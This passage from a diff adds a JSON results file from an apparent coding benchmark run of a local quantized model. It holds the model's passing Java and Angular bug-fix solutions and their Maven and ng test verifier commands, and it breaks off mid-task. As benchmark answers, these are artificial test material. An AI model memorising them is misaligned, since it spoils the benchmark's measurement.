@@ -1,0 +1,1131 @@
+{
+  "tag": "strata-iq3s-gpu-unlock-full50",
+  "url": "http://192.168.0.175:8080",
+  "model": "qwen3.8-flash-next-iq3_s",
+  "notes": "",
+  "selected_categories": [
+    "java-spring",
+    "ts-angular",
+    "sql-migrations",
+    "mcp-tools",
+    "security-review",
+    "long-context"
+  ],
+  "timeout_override_s": null,
+  "runner_python": "3.12.3",
+  "suite_git_commit": "6baaecb3be0a635a283d4d3d33016fbde8cb0384",
+  "suite_git_dirty": true,
+  "preflight": {
+    "checked_at": "2026-10-31T11:11:11.899570+00:00",
+    "models_url": "http://192.168.0.175:8080/v1/models",
+    "requested_model": "qwen3.8-flash-next-iq3_s",
+    "requested_model_found": true,
+    "available_model_ids": [
+      "qwen3.8-flash-next-iq3_s"
+    ],
+    "selected_model_entry": {
+      "id": "qwen3.8-flash-next-iq3_s",
+      "object": "model",
+      "status": {
+        "value": "loaded"
+      },
+      "meta": {
+        "n_ctx": 262144
+      },
+      "architecture": {
+        "input_modalities": [
+          "text",
+          "image"
+        ],
+        "output_modalities": [
+          "text"
+        ]
+      }
+    }
+  },
+  "started_at": "2026-10-31T11:11:11.904793+00:00",
+  "finished_at": "2026-10-31T11:21:56.979798+00:00",
+  "total_wall_s": 645.0749833583832,
+  "total_pass": 48,
+  "total_tasks": 50,
+  "categories": [
+    {
+      "category": "java-spring",
+      "n_pass": 10,
+      "n_total": 10,
+      "wall_s": 77.77904081344604,
+      "returncode": 0,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-pagination-calculator",
+          "passed": true,
+          "elapsed_s": 7.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-pagination-calculator",
+            "category": "java-spring",
+            "class_name": "PaginationCalculator",
+            "response_length": 650,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\n/**\n * Computes pagination metadata for a result set.\n */\npublic class PaginationCalculator {\n\n    /**\n     * Returns the total number of pages needed to display {@code totalItems}\n     * items at {@code pageSize} items per page. Must round UP (a partial\n     * last page still counts as a full page).\n     */\n    public int totalPages(int totalItems, int pageSize) {\n        if (pageSize <= 0) {\n            throw new IllegalArgumentException(\"pageSize must be positive\");\n        }\n        if (totalItems <= 0) {\n            return 0;\n        }\n        return (totalItems + pageSize - 1) / pageSize;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\n/**\n * Computes pagination metadata for a result set.\n */\npublic class PaginationCalculator {\n\n    /**\n     * Returns the total number of pages needed to display {@code totalItems}\n     * items at {@code pageSize} items per page. Must round UP (a partial\n     * last page still counts as a full page).\n     */\n    public int totalPages(int totalItems, int pageSize) {\n        if (pageSize <= 0) {\n            throw new IllegalArgumentException(\"pageSize must be positive\");\n        }\n        if (totalItems <= 0) {\n            return 0;\n        }\n        return (totalItems + pageSize - 1) / pageSize;\n    }\n}\n",
+            "candidate_length": 639,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=PaginationCalculatorTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "02-discount-calculator",
+          "passed": true,
+          "elapsed_s": 9.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-discount-calculator",
+            "category": "java-spring",
+            "class_name": "DiscountCalculator",
+            "response_length": 847,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.math.RoundingMode;\n\n/**\n * Applies a percentage discount to a price.\n */\npublic class DiscountCalculator {\n\n    /**\n     * Applies {@code discountPercent} (e.g. 15 for 15%) to {@code price} and\n     * returns the discounted price, rounded to 2 decimal places (HALF_UP).\n     */\n    public BigDecimal applyDiscount(BigDecimal price, BigDecimal discountPercent) {\n        if (price == null || discountPercent == null) {\n            throw new IllegalArgumentException(\"price and discountPercent must not be null\");\n        }\n        BigDecimal discountAmount = price.multiply(discountPercent).divide(BigDecimal.valueOf(100));\n        BigDecimal discountedPrice = price.subtract(discountAmount);\n        return discountedPrice.setScale(2, RoundingMode.HALF_UP);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.math.RoundingMode;\n\n/**\n * Applies a percentage discount to a price.\n */\npublic class DiscountCalculator {\n\n    /**\n     * Applies {@code discountPercent} (e.g. 15 for 15%) to {@code price} and\n     * returns the discounted price, rounded to 2 decimal places (HALF_UP).\n     */\n    public BigDecimal applyDiscount(BigDecimal price, BigDecimal discountPercent) {\n        if (price == null || discountPercent == null) {\n            throw new IllegalArgumentException(\"price and discountPercent must not be null\");\n        }\n        BigDecimal discountAmount = price.multiply(discountPercent).divide(BigDecimal.valueOf(100));\n        BigDecimal discountedPrice = price.subtract(discountAmount);\n        return discountedPrice.setScale(2, RoundingMode.HALF_UP);\n    }\n}\n",
+            "candidate_length": 836,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=DiscountCalculatorTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "03-inventory-counter",
+          "passed": true,
+          "elapsed_s": 7.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-inventory-counter",
+            "category": "java-spring",
+            "class_name": "InventoryCounter",
+            "response_length": 1160,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * Thread-safe counter tracking available inventory across concurrent\n * reservation attempts.\n */\npublic class InventoryCounter {\n\n    private final AtomicInteger available;\n\n    public InventoryCounter(int initialStock) {\n        this.available = new AtomicInteger(initialStock);\n    }\n\n    /**\n     * Attempts to reserve {@code quantity} units. Returns true and\n     * decrements available stock if enough units are available; returns\n     * false (and leaves stock unchanged) otherwise. Must be safe to call\n     * concurrently from many threads without ever allowing available stock\n     * to go negative or losing a reservation that should have succeeded.\n     */\n    public boolean reserve(int quantity) {\n        while (true) {\n            int current = available.get();\n            if (current < quantity) {\n                return false;\n            }\n            if (available.compareAndSet(current, current - quantity)) {\n                return true;\n            }\n        }\n    }\n\n    public int getAvailable() {\n        return available.get();\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * Thread-safe counter tracking available inventory across concurrent\n * reservation attempts.\n */\npublic class InventoryCounter {\n\n    private final AtomicInteger available;\n\n    public InventoryCounter(int initialStock) {\n        this.available = new AtomicInteger(initialStock);\n    }\n\n    /**\n     * Attempts to reserve {@code quantity} units. Returns true and\n     * decrements available stock if enough units are available; returns\n     * false (and leaves stock unchanged) otherwise. Must be safe to call\n     * concurrently from many threads without ever allowing available stock\n     * to go negative or losing a reservation that should have succeeded.\n     */\n    public boolean reserve(int quantity) {\n        while (true) {\n            int current = available.get();\n            if (current < quantity) {\n                return false;\n            }\n            if (available.compareAndSet(current, current - quantity)) {\n                return true;\n            }\n        }\n    }\n\n    public int getAvailable() {\n        return available.get();\n    }\n}\n",
+            "candidate_length": 1149,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=InventoryCounterTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "04-date-range-overlap",
+          "passed": true,
+          "elapsed_s": 7.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-date-range-overlap",
+            "category": "java-spring",
+            "class_name": "DateRangeOverlap",
+            "response_length": 614,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.time.LocalDate;\n\n/**\n * Checks whether two date ranges (inclusive on both ends) overlap.\n */\npublic class DateRangeOverlap {\n\n    /**\n     * Returns true if [startA, endA] and [startB, endB] share at least one\n     * day in common. Both ranges are inclusive of their start and end\n     * dates. A range that merely touches at a single shared boundary day\n     * counts as overlapping.\n     */\n    public boolean overlaps(LocalDate startA, LocalDate endA, LocalDate startB, LocalDate endB) {\n        return !startA.isAfter(endB) && !startB.isAfter(endA);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.time.LocalDate;\n\n/**\n * Checks whether two date ranges (inclusive on both ends) overlap.\n */\npublic class DateRangeOverlap {\n\n    /**\n     * Returns true if [startA, endA] and [startB, endB] share at least one\n     * day in common. Both ranges are inclusive of their start and end\n     * dates. A range that merely touches at a single shared boundary day\n     * counts as overlapping.\n     */\n    public boolean overlaps(LocalDate startA, LocalDate endA, LocalDate startB, LocalDate endB) {\n        return !startA.isAfter(endB) && !startB.isAfter(endA);\n    }\n}\n",
+            "candidate_length": 603,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=DateRangeOverlapTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "05-csv-field-parser",
+          "passed": true,
+          "elapsed_s": 8.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-csv-field-parser",
+            "category": "java-spring",
+            "class_name": "CsvFieldParser",
+            "response_length": 1122,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Splits a single line of naive CSV into fields, respecting double-quoted\n * fields that may themselves contain commas.\n */\npublic class CsvFieldParser {\n\n    /**\n     * Splits {@code line} on commas, except commas that appear inside a\n     * double-quoted field (e.g. {@code a,\"b,c\",d} -> [\"a\", \"b,c\", \"d\"]).\n     * Surrounding quotes on a quoted field are stripped from the result.\n     */\n    public List<String> parseLine(String line) {\n        List<String> fields = new ArrayList<>();\n        StringBuilder current = new StringBuilder();\n        boolean inQuotes = false;\n\n        for (int i = 0; i < line.length(); i++) {\n            char c = line.charAt(i);\n            if (c == '\"') {\n                inQuotes = !inQuotes;\n            } else if (c == ',' && !inQuotes) {\n                fields.add(current.toString());\n                current = new StringBuilder();\n            } else {\n                current.append(c);\n            }\n        }\n        fields.add(current.toString());\n        return fields;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Splits a single line of naive CSV into fields, respecting double-quoted\n * fields that may themselves contain commas.\n */\npublic class CsvFieldParser {\n\n    /**\n     * Splits {@code line} on commas, except commas that appear inside a\n     * double-quoted field (e.g. {@code a,\"b,c\",d} -> [\"a\", \"b,c\", \"d\"]).\n     * Surrounding quotes on a quoted field are stripped from the result.\n     */\n    public List<String> parseLine(String line) {\n        List<String> fields = new ArrayList<>();\n        StringBuilder current = new StringBuilder();\n        boolean inQuotes = false;\n\n        for (int i = 0; i < line.length(); i++) {\n            char c = line.charAt(i);\n            if (c == '\"') {\n                inQuotes = !inQuotes;\n            } else if (c == ',' && !inQuotes) {\n                fields.add(current.toString());\n                current = new StringBuilder();\n            } else {\n                current.append(c);\n            }\n        }\n        fields.add(current.toString());\n        return fields;\n    }\n}\n",
+            "candidate_length": 1111,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=CsvFieldParserTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "06-moving-average",
+          "passed": true,
+          "elapsed_s": 6.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-moving-average",
+            "category": "java-spring",
+            "class_name": "MovingAverage",
+            "response_length": 1025,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.ArrayDeque;\nimport java.util.Deque;\n\n/**\n * Maintains a simple moving average over the last {@code windowSize}\n * values added.\n */\npublic class MovingAverage {\n\n    private final int windowSize;\n    private final Deque<Double> window = new ArrayDeque<>();\n    private double sum = 0.0;\n\n    public MovingAverage(int windowSize) {\n        if (windowSize <= 0) {\n            throw new IllegalArgumentException(\"windowSize must be positive\");\n        }\n        this.windowSize = windowSize;\n    }\n\n    /**\n     * Adds a new value, evicting the oldest value once the window exceeds\n     * {@code windowSize} entries, and returns the current average over the\n     * values currently in the window.\n     */\n    public double add(double value) {\n        window.addLast(value);\n        sum += value;\n        if (window.size() > windowSize) {\n            double removed = window.removeFirst();\n            sum -= removed;\n        }\n        return sum / window.size();\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.ArrayDeque;\nimport java.util.Deque;\n\n/**\n * Maintains a simple moving average over the last {@code windowSize}\n * values added.\n */\npublic class MovingAverage {\n\n    private final int windowSize;\n    private final Deque<Double> window = new ArrayDeque<>();\n    private double sum = 0.0;\n\n    public MovingAverage(int windowSize) {\n        if (windowSize <= 0) {\n            throw new IllegalArgumentException(\"windowSize must be positive\");\n        }\n        this.windowSize = windowSize;\n    }\n\n    /**\n     * Adds a new value, evicting the oldest value once the window exceeds\n     * {@code windowSize} entries, and returns the current average over the\n     * values currently in the window.\n     */\n    public double add(double value) {\n        window.addLast(value);\n        sum += value;\n        if (window.size() > windowSize) {\n            double removed = window.removeFirst();\n            sum -= removed;\n        }\n        return sum / window.size();\n    }\n}\n",
+            "candidate_length": 1014,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=MovingAverageTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "07-money",
+          "passed": true,
+          "elapsed_s": 8.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-money",
+            "category": "java-spring",
+            "class_name": "Money",
+            "response_length": 1360,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.util.Objects;\n\n/**\n * An immutable value object representing an amount in a given currency.\n * Two Money instances are equal if they have the same currency and the\n * same numeric amount (regardless of trailing zeros / scale, e.g. 2.50 and\n * 2.5 are equal), and must produce equal hashCode()s when equal(), per the\n * general equals/hashCode contract.\n */\npublic final class Money {\n\n    private final BigDecimal amount;\n    private final String currency;\n\n    public Money(BigDecimal amount, String currency) {\n        this.amount = Objects.requireNonNull(amount);\n        this.currency = Objects.requireNonNull(currency);\n    }\n\n    public BigDecimal getAmount() {\n        return amount;\n    }\n\n    public String getCurrency() {\n        return currency;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (!(o instanceof Money)) return false;\n        Money other = (Money) o;\n        // compareTo ignores scale differences (2.50 vs 2.5), matching the\n        // documented equality contract above.\n        return amount.compareTo(other.amount) == 0 && currency.equals(other.currency);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(amount.stripTrailingZeros().hashCode(), currency);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.util.Objects;\n\n/**\n * An immutable value object representing an amount in a given currency.\n * Two Money instances are equal if they have the same currency and the\n * same numeric amount (regardless of trailing zeros / scale, e.g. 2.50 and\n * 2.5 are equal), and must produce equal hashCode()s when equal(), per the\n * general equals/hashCode contract.\n */\npublic final class Money {\n\n    private final BigDecimal amount;\n    private final String currency;\n\n    public Money(BigDecimal amount, String currency) {\n        this.amount = Objects.requireNonNull(amount);\n        this.currency = Objects.requireNonNull(currency);\n    }\n\n    public BigDecimal getAmount() {\n        return amount;\n    }\n\n    public String getCurrency() {\n        return currency;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (!(o instanceof Money)) return false;\n        Money other = (Money) o;\n        // compareTo ignores scale differences (2.50 vs 2.5), matching the\n        // documented equality contract above.\n        return amount.compareTo(other.amount) == 0 && currency.equals(other.currency);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(amount.stripTrailingZeros().hashCode(), currency);\n    }\n}\n",
+            "candidate_length": 1349,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=MoneyTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "08-retrying-operation",
+          "passed": true,
+          "elapsed_s": 6.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-retrying-operation",
+            "category": "java-spring",
+            "class_name": "RetryingOperation",
+            "response_length": 1141,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.concurrent.Callable;\n\n/**\n * Retries a flaky operation up to a fixed number of times, re-throwing the\n * last failure if every attempt fails.\n */\npublic class RetryingOperation {\n\n    /**\n     * Calls {@code operation} up to {@code maxAttempts} times. Returns the\n     * first successful result. If every attempt throws, re-throws the\n     * exception from the LAST attempt (not the first), wrapped in a\n     * RuntimeException if it isn't one already.\n     */\n    public <T> T runWithRetry(Callable<T> operation, int maxAttempts) {\n        if (maxAttempts <= 0) {\n            throw new IllegalArgumentException(\"maxAttempts must be positive\");\n        }\n        Exception lastFailure = null;\n        for (int attempt = 1; attempt <= maxAttempts; attempt++) {\n            try {\n                return operation.call();\n            } catch (Exception e) {\n                lastFailure = e;\n            }\n        }\n        if (lastFailure instanceof RuntimeException) {\n            throw (RuntimeException) lastFailure;\n        }\n        throw new RuntimeException(lastFailure);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.concurrent.Callable;\n\n/**\n * Retries a flaky operation up to a fixed number of times, re-throwing the\n * last failure if every attempt fails.\n */\npublic class RetryingOperation {\n\n    /**\n     * Calls {@code operation} up to {@code maxAttempts} times. Returns the\n     * first successful result. If every attempt throws, re-throws the\n     * exception from the LAST attempt (not the first), wrapped in a\n     * RuntimeException if it isn't one already.\n     */\n    public <T> T runWithRetry(Callable<T> operation, int maxAttempts) {\n        if (maxAttempts <= 0) {\n            throw new IllegalArgumentException(\"maxAttempts must be positive\");\n        }\n        Exception lastFailure = null;\n        for (int attempt = 1; attempt <= maxAttempts; attempt++) {\n            try {\n                return operation.call();\n            } catch (Exception e) {\n                lastFailure = e;\n            }\n        }\n        if (lastFailure instanceof RuntimeException) {\n            throw (RuntimeException) lastFailure;\n        }\n        throw new RuntimeException(lastFailure);\n    }\n}\n",
+            "candidate_length": 1130,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=RetryingOperationTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "09-request-id-generator",
+          "passed": true,
+          "elapsed_s": 9.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "09-request-id-generator",
+            "category": "java-spring",
+            "class_name": "RequestIdGenerator",
+            "response_length": 1100,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport org.springframework.stereotype.Component;\n\n/**\n * A singleton Spring bean that generates sequential request IDs of the\n * form \"REQ-<currentUserId>-<sequence>\" for the currently-processing\n * request. Because this bean is a singleton (Spring's default scope), it\n * is shared across all concurrently-handled HTTP requests in the\n * application -- it must never hold per-request mutable state as an\n * instance field.\n */\n@Component\npublic class RequestIdGenerator {\n\n    private final ThreadLocal<String> currentUserId = new ThreadLocal<>();\n    private final ThreadLocal<Integer> sequence = ThreadLocal.withInitial(() -> 0);\n\n    /** Called once at the start of handling a request for the given user. */\n    public void startRequest(String userId) {\n        currentUserId.set(userId);\n        sequence.set(0);\n    }\n\n    /** Called to produce the next ID for the request started above. */\n    public String generateId() {\n        int seq = sequence.get() + 1;\n        sequence.set(seq);\n        return \"REQ-\" + currentUserId.get() + \"-\" + seq;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport org.springframework.stereotype.Component;\n\n/**\n * A singleton Spring bean that generates sequential request IDs of the\n * form \"REQ-<currentUserId>-<sequence>\" for the currently-processing\n * request. Because this bean is a singleton (Spring's default scope), it\n * is shared across all concurrently-handled HTTP requests in the\n * application -- it must never hold per-request mutable state as an\n * instance field.\n */\n@Component\npublic class RequestIdGenerator {\n\n    private final ThreadLocal<String> currentUserId = new ThreadLocal<>();\n    private final ThreadLocal<Integer> sequence = ThreadLocal.withInitial(() -> 0);\n\n    /** Called once at the start of handling a request for the given user. */\n    public void startRequest(String userId) {\n        currentUserId.set(userId);\n        sequence.set(0);\n    }\n\n    /** Called to produce the next ID for the request started above. */\n    public String generateId() {\n        int seq = sequence.get() + 1;\n        sequence.set(seq);\n        return \"REQ-\" + currentUserId.get() + \"-\" + seq;\n    }\n}\n",
+            "candidate_length": 1089,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=RequestIdGeneratorTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "10-lru-cache",
+          "passed": true,
+          "elapsed_s": 6.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "10-lru-cache",
+            "category": "java-spring",
+            "class_name": "LruCache",
+            "response_length": 1152,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.LinkedHashMap;\nimport java.util.Map;\n\n/**\n * A fixed-capacity cache that evicts the Least Recently Used entry when\n * full. \"Recently used\" must be updated on both writes (put) AND reads\n * (get) -- reading an entry counts as using it, so it should not be the\n * next one evicted.\n */\npublic class LruCache<K, V> {\n\n    private final int capacity;\n    private final Map<K, V> map;\n\n    public LruCache(int capacity) {\n        if (capacity <= 0) {\n            throw new IllegalArgumentException(\"capacity must be positive\");\n        }\n        this.capacity = capacity;\n        this.map = new LinkedHashMap<>(capacity, 0.75f, true) {\n            @Override\n            protected boolean removeEldestEntry(Map.Entry<K, V> eldest) {\n                return size() > LruCache.this.capacity;\n            }\n        };\n    }\n\n    public void put(K key, V value) {\n        map.put(key, value);\n    }\n\n    public V get(K key) {\n        return map.get(key);\n    }\n\n    public boolean containsKey(K key) {\n        return map.containsKey(key);\n    }\n\n    public int size() {\n        return map.size();\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.LinkedHashMap;\nimport java.util.Map;\n\n/**\n * A fixed-capacity cache that evicts the Least Recently Used entry when\n * full. \"Recently used\" must be updated on both writes (put) AND reads\n * (get) -- reading an entry counts as using it, so it should not be the\n * next one evicted.\n */\npublic class LruCache<K, V> {\n\n    private final int capacity;\n    private final Map<K, V> map;\n\n    public LruCache(int capacity) {\n        if (capacity <= 0) {\n            throw new IllegalArgumentException(\"capacity must be positive\");\n        }\n        this.capacity = capacity;\n        this.map = new LinkedHashMap<>(capacity, 0.75f, true) {\n            @Override\n            protected boolean removeEldestEntry(Map.Entry<K, V> eldest) {\n                return size() > LruCache.this.capacity;\n            }\n        };\n    }\n\n    public void put(K key, V value) {\n        map.put(key, value);\n    }\n\n    public V get(K key) {\n        return map.get(key);\n    }\n\n    public boolean containsKey(K key) {\n        return map.containsKey(key);\n    }\n\n    public int size() {\n        return map.size();\n    }\n}\n",
+            "candidate_length": 1141,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=LruCacheTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        }
+      ],
+      "artifact_count": 10,
+      "logs": []
+    },
+    {
+      "category": "ts-angular",
+      "n_pass": 8,
+      "n_total": 8,
+      "wall_s": 57.55270481109619,
+      "returncode": 0,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-price-formatter",
+          "passed": true,
+          "elapsed_s": 5.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-price-formatter",
+            "category": "ts-angular",
+            "file_name": "price-formatter.ts",
+            "spec_name": "price-formatter.spec.ts",
+            "response_length": 336,
+            "response_excerpt": "```ts\n/**\n * Formats a price in cents (integer) as a currency string, e.g.\n * formatPrice(1050) -> \"$10.50\", formatPrice(5) -> \"$0.05\".\n */\nexport function formatPrice(cents: number): string {\n  const dollars = Math.floor(cents / 100);\n  const remainder = cents % 100;\n  return `$${dollars}.${String(remainder).padStart(2, '0')}`;\n}\n```",
+            "candidate_ts": "/**\n * Formats a price in cents (integer) as a currency string, e.g.\n * formatPrice(1050) -> \"$10.50\", formatPrice(5) -> \"$0.05\".\n */\nexport function formatPrice(cents: number): string {\n  const dollars = Math.floor(cents / 100);\n  const remainder = cents % 100;\n  return `$${dollars}.${String(remainder).padStart(2, '0')}`;\n}\n",
+            "candidate_length": 327,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/price-formatter.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "02-search-service",
+          "passed": true,
+          "elapsed_s": 8.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-search-service",
+            "category": "ts-angular",
+            "file_name": "search.service.ts",
+            "spec_name": "search.service.spec.ts",
+            "response_length": 1531,
+            "response_excerpt": "```ts\nimport { Injectable } from '@angular/core';\nimport { Observable, Subject } from 'rxjs';\nimport { map, switchMap } from 'rxjs/operators';\n\n/**\n * A minimal \"search as you type\" service: emits the latest search results\n * for the most recently issued query term, discarding results from any\n * earlier, now-superseded queries (a classic race condition when a slow\n * earlier request resolves AFTER a fast later request).\n */\n@Injectable({ providedIn: 'root' })\nexport class SearchService {\n  private readonly queries = new Subject<string>();\n\n  /** Simulates a backend call whose latency depends on the query string. */\n  search(term: string): Observable<string[]> {\n    return new Observable<string[]>((subscriber) => {\n      const delayMs = term.length * 10;\n      const timer = setTimeout(() => {\n        subscriber.next([`${term}-result-1`, `${term}-result-2`]);\n        subscriber.complete();\n      }, delayMs);\n      return () => clearTimeout(timer);\n    });\n  }\n\n  /** Call this whenever the user types a new query term. */\n  setQuery(term: string): void {\n    this.queries.next(term);\n  }\n\n  /**\n   * Stream of results for the LATEST issued query only. If an older query\n   * is still in flight when a newer one is issued, the older query's\n   * results must never be emitted here -- only the newest query's results\n   * should ever reach subscribers.\n   */\n  results(): Observable<string[]> {\n    return this.queries.pipe(\n      switchMap((term) => this.search(term)),\n      map((results) => results),\n    );\n  }\n}\n```",
+            "candidate_ts": "import { Injectable } from '@angular/core';\nimport { Observable, Subject } from 'rxjs';\nimport { map, switchMap } from 'rxjs/operators';\n\n/**\n * A minimal \"search as you type\" service: emits the latest search results\n * for the most recently issued query term, discarding results from any\n * earlier, now-superseded queries (a classic race condition when a slow\n * earlier request resolves AFTER a fast later request).\n */\n@Injectable({ providedIn: 'root' })\nexport class SearchService {\n  private readonly queries = new Subject<string>();\n\n  /** Simulates a backend call whose latency depends on the query string. */\n  search(term: string): Observable<string[]> {\n    return new Observable<string[]>((subscriber) => {\n      const delayMs = term.length * 10;\n      const timer = setTimeout(() => {\n        subscriber.next([`${term}-result-1`, `${term}-result-2`]);\n        subscriber.complete();\n      }, delayMs);\n      return () => clearTimeout(timer);\n    });\n  }\n\n  /** Call this whenever the user types a new query term. */\n  setQuery(term: string): void {\n    this.queries.next(term);\n  }\n\n  /**\n   * Stream of results for the LATEST issued query only. If an older query\n   * is still in flight when a newer one is issued, the older query's\n   * results must never be emitted here -- only the newest query's results\n   * should ever reach subscribers.\n   */\n  results(): Observable<string[]> {\n    return this.queries.pipe(\n      switchMap((term) => this.search(term)),\n      map((results) => results),\n    );\n  }\n}\n",
+            "candidate_length": 1522,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/search.service.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "03-shopping-cart",
+          "passed": true,
+          "elapsed_s": 9.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-shopping-cart",
+            "category": "ts-angular",
+            "file_name": "shopping-cart.ts",
+            "spec_name": "shopping-cart.spec.ts",
+            "response_length": 804,
+            "response_excerpt": "```ts\nimport { Injectable, signal } from '@angular/core';\n\nexport interface CartItem {\n  id: string;\n  price: number; // in cents\n  quantity: number;\n}\n\n/**\n * Signal-based shopping cart. `total` must always reflect the current sum\n * of price * quantity across all items, recomputed reactively whenever\n * items change.\n */\n@Injectable({ providedIn: 'root' })\nexport class ShoppingCart {\n  private readonly _items = signal<CartItem[]>([]);\n  readonly items = this._items.asReadonly();\n\n  get total(): number {\n    return this._items().reduce((sum, item) => sum + item.price * item.quantity, 0);\n  }\n\n  addItem(item: CartItem): void {\n    this._items.update((items) => [...items, item]);\n  }\n\n  removeItem(id: string): void {\n    this._items.update((items) => items.filter((i) => i.id !== id));\n  }\n}\n```",
+            "candidate_ts": "import { Injectable, signal } from '@angular/core';\n\nexport interface CartItem {\n  id: string;\n  price: number; // in cents\n  quantity: number;\n}\n\n/**\n * Signal-based shopping cart. `total` must always reflect the current sum\n * of price * quantity across all items, recomputed reactively whenever\n * items change.\n */\n@Injectable({ providedIn: 'root' })\nexport class ShoppingCart {\n  private readonly _items = signal<CartItem[]>([]);\n  readonly items = this._items.asReadonly();\n\n  get total(): number {\n    return this._items().reduce((sum, item) => sum + item.price * item.quantity, 0);\n  }\n\n  addItem(item: CartItem): void {\n    this._items.update((items) => [...items, item]);\n  }\n\n  removeItem(id: string): void {\n    this._items.update((items) => items.filter((i) => i.id !== id));\n  }\n}\n",
+            "candidate_length": 795,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/shopping-cart.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "04-password-match-validator",
+          "passed": true,
+          "elapsed_s": 5.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-password-match-validator",
+            "category": "ts-angular",
+            "file_name": "password-match.validator.ts",
+            "spec_name": "password-match.validator.spec.ts",
+            "response_length": 1078,
